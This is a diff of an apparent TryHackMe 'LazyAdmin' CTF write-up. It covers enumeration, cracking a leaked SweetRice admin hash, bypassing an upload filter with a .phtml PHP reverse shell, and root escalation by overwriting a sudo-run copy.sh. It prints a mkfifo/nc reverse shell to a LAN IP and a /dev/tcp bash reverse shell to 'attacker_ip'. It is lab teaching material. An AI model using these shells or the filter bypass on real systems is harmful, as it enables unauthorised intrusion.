@@ -14,9 +14,12 @@ comments: false
 
 
 
-We start off running an Nmap scan to enumerate the open ports
+We start off running an Nmap scan to enumerate the open ports on the target
 
->nmap -sCV x.x.x.x
+
+{% highlight bash %}
+$ nmap -sCV x.x.x.x
+{% endhighlight bash %}
 
 We can see that ports 22 & 80 are open in the nmap scan below
 
@@ -25,10 +28,15 @@ We can see that ports 22 & 80 are open in the nmap scan below
 
 
 Navigating to the webpage shows us a basic apache webserver page
+
 Lets enumerated directories and subdirectories with [dirb](https://www.kali.org/tools/dirb/)
 
-> dirb http://x.x.x.x
+The script below will scan against the common.txt directory wordlist
 
+
+{% highlight bash %}
+$ dirb http://x.x.x.x
+{% endhighlight bash %}
 
 We can see in the screenshot below that there are a few directories of interest
 
@@ -36,7 +44,7 @@ We can see in the screenshot below that there are a few directories of interest
 ![img]({{ '/assets/images/2-lazyadmin.png' | relative_url }}){: .center-image }
 
 
-Navigating to "/content" show us that this site is running CMS sweetRice and not fully developed
+Navigating to "/content" show us that this site is running CMS sweetRice and not fully developed yet
 Lets see if there are any obvious vulnerabilities that have not yet been patched
 
 
@@ -56,8 +64,9 @@ I also found a "sweetrice" file upload vulnerability that may be possible, but t
 Going back to our directory scan, lets inspected alternate web pages that were enumerated
 
 Navigating to "/content/inc" we find a directory list and site map
-We show ~30 different files and direrectories here, but one caught my eye... 
-mysql_backup/
+We show ~30 different files and directories here, but one caught my eye... 
+
+>mysql_backup/
 
 
 ![img]({{ '/assets/images/5-lazyadmin.png' | relative_url }}){: .center-image }
@@ -81,13 +90,12 @@ Looking at this file we can see that it shows us an admin username and hashed pa
 ![img]({{ '/assets/images/8-lazyadmin.png' | relative_url }}){: .center-image }
 
 
->manager
->42f749ade7f9e195bf475f37a44cafcb 
+>admin user: manager
+>hash: 42f749ade7f9e195bf475f37a44cafcb 
 
 
 Lets try to crack this hash first with an online crack tool
-Using [hashes.com](https://hashes.com/en/decrypt/hash)
-We are able to crack the hash easily
+Using [hashes.com](https://hashes.com/en/decrypt/hash), We are able to crack the hash easily
 
 
 
@@ -104,8 +112,8 @@ Let's try to Login with the new credentials at the login page...
 
 SUCCESS !
 
-looking around this page for potential vulnerabilites,
-We can see there is the option to upload files in the "MEDIA CENTER" page
+Looking around this page for potential vulnerabilites,
+We can see there is the option to upload files on the "MEDIA CENTER" page
 
 
 ![img]({{ '/assets/images/11-lazyadmin.png' | relative_url }}){: .center-image }
@@ -113,60 +121,73 @@ We can see there is the option to upload files in the "MEDIA CENTER" page
 
 Lets try and upload a known malicious file...
 I tried to upload the php reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)
-Not forgetting to modify the IP and port to point to your machine and listener
-This hoever failed and did not upload successfully 
-We can see that there is a filter in place preventing our upload
+Not forgetting to modify the IP and port to point to our machine and listener
+This however failed and did not upload successfully 
+
+We can determine that there is a filter in place preventing our upload
 Let's try and modify the request and see if we can bypass the filter
-.........................................
+--------------------------------------------------------------------
 Using [Burpsuite](https://portswigger.net/burp/communitydownload)
 Lets reload and capture the page in order to modify the request
-Let's try to change the request from .php to .phtml and forward the request
+Let's try to change the request from of our payload from '.php' to '.phtml' and forward the request
 
 
 ![img]({{ '/assets/images/12-lazyadmin.png' | relative_url }}){: .center-image }
 
-We can see that this was succfully uploaded and bypassed the filter
+We can see that this bypassed the filter and was succfully uploaded !
 
 
 ![img]({{ '/assets/images/13-lazyadmin.png' | relative_url }}){: .center-image }
 
-Lets start our listner and navigate to the reverse shell we just uploaded by clicking the link
-WE now get a successful shell on our machine to the target machine
+Lets start our listner and navigate to the reverse shell we just uploaded by clicking the link on the page
+We now get a successful shell on our machine connecting to the target machine
+
+
 Lets move into the /home directory and capture our root flag
 
 
 
 ![img]({{ '/assets/images/14-lazyadmin.png' | relative_url }}){: .center-image }
 
-> Flag: THM{redacted}
+> Flag: THM[redacted]
 
 
 _________________
 
-We now got the User Flag !!!
+We now captured the User Flag !!!
 
 Lets try and escalate our privilege to get the root flag...
 
 
->sudo -l 
+
+{% highlight bash %}
+$ sudo -l 
+{% endhighlight bash %}
+
 
 Running the command above shows that itguy can run a perl script called 'backup.pl' as root
-It appears to executes a bash script named '/etc/copy.sh'
-Looking inside we see there is a  file which shows a script being run
+We can inspect and see that it executes a bash script at '/etc/copy.sh'
+Inspecting this we see there is a  file which shows a script being run
 
 
 ![img]({{ '/assets/images/15-lazyadmin.png' | relative_url }}){: .center-image }
 
->rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
+{% highlight bash %}
+$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
+{% endhighlight bash %}
+
+
 
 
 Lets modify it to point to our IP and port of our listener 
 
-> echo "bash -i >& /dev/tcp/attacker_ip/port 0>&1" > copy.sh
 
+{% highlight bash %}
+$  echo "bash -i >& /dev/tcp/attacker_ip/port 0>&1" > copy.sh
+{% endhighlight bash %}
 
-*Remember we are already connected on the port we originally chose...
-*So we will need to start a second listener and a different port from the first listener we set up
+*Remember we are already connected on the port we chose for the first shell connection
+*So we will need to select a second listener and a different port from the first listener we set up
 
 
 ![img]({{ '/assets/images/16-lazyadmin.png' | relative_url }}){: .center-image }
@@ -174,17 +195,21 @@ Lets modify it to point to our IP and port of our listener
 Lets run the command below to start the script
 
 
->$sudo /usr/bin/perl /home/itguy/backup.pl
+
+{% highlight bash %}
+$ sudo /usr/bin/perl /home/itguy/backup.pl
+{% endhighlight bash %}
 
 
-We now get our reverse shell as root !!!
+
+We now get our reverse shell as root on our machine!!!
 Lets cat out /root/root.txt to capture the ROOT FLAG
 
 
 
 ![img]({{ '/assets/images/17-lazyadmin.png' | relative_url }}){: .center-image }
 
-We have now captured the root flag and pwnd the machine
+We have now captured the root flag and pwnd the machine !
 
 
 
